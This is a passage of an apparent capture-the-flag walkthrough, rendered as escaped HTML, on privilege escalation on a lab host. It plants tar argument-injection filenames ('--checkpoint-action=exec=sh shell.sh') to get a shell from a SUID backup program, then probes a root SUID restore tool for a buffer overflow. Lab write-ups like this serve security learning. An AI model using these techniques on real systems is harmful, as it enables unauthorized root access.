&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="k"&gt;checkpoint&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="k"&gt;checkpoint&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwxrwxrwx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6144&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Feb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sqlite&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;framework&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jun&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="c1"&gt;--   1 bryan bryan    8 Mar 12 11:54 shell.s&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch the backup program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;backup&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;4.2&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1002&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1002&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="root-me"&gt;root me?&lt;/h3&gt;
&lt;p&gt;Let get us back a real shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You may need to change the permission of bryan's &lt;code&gt;.bashrc&lt;/code&gt; as you can get an
error about it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII ~&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;777&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;(Yes I had to exit the shell and start again the operations :/)&lt;/p&gt;
&lt;p&gt;Next we need to use the &lt;code&gt;restore&lt;/code&gt; program also in &lt;code&gt;/usr/local/bin/&lt;/code&gt; own by root
with the SUID set and executable by the &lt;code&gt;sean&lt;/code&gt; group. First we need to change
our group (as the one used is &lt;code&gt;bryan&lt;/code&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;newgrp sean&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us try the program by creating and empty archive in &lt;code&gt;/tmp/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;touch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;restore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Restore&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;tool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;This&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;following&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;currently&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;running&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;tool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;1002&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This looks like we would have to use a buffer overflow the get a root shell as
the program segfault when the input for the "output directory" is too long:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Restore&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;tool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
